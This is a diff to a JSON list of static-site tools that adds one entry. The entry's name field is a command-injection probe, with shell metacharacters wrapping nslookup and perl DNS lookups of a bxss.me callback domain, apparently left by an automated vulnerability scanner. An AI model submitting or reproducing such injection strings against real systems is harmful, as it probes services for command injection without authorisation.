@@ -977,5 +977,14 @@
       ""
     ],
     "description": "Add dynamic content (comments, email subscriptions) to your static site."
+  },
+  {
+    "name": "&(nslookup hitlcbkmzcluu1e42f.bxss.me||perl -e \"gethostbyname('hitlcbkmzcluu1e42f.bxss.me')\")&'\\\"`0&(nslookup hitlcbkmzcluu1e42f.bxss.me||perl -e \"gethostbyname('hitlcbkmzcluu1e42f.bxss.me')\")&`'",
+    "url": "",
+    "code": "",
+    "tags": [
+      ""
+    ],
+    "description": "1"
   }
 ]
